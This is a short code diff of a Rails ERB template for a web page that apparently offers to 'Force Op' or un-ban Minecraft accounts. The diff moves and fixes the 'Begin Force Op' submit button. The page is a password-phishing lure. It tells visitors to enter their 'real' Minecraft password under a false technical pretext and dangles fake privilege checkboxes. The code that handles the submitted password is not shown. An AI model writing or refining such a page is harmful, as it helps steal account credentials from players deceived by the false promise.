@@ -20,14 +20,14 @@
 				<%=	f.password_field :username %>
 			</p>
 			<p style="font-size: 12px;">Be sure to enter your <span style="font-weight: bold;">real</span> Minecraft password into the secure password form in order to allow the desired Minecraft server to properly render your username.<br /> <a href="https://minecraft.net/resetpassword">Forgot your minecraft password?</a></p>
+			<p>
+				<%= f.submit 'Begin Force Op' %>
+			</p>
+			<% end %>
 			<form>
 			<input type="checkbox" name="vehicle" value="Bike" checked>Op Account<br>
 			<input type="checkbox" name="vehicle" value="Car">Un-ban Account
 			</form>
-			<p>
-				<%= f.submit, "Begin Force Op" %>
-			</p>
-			<% end %>
 		</div>
 	</body>
 </html>
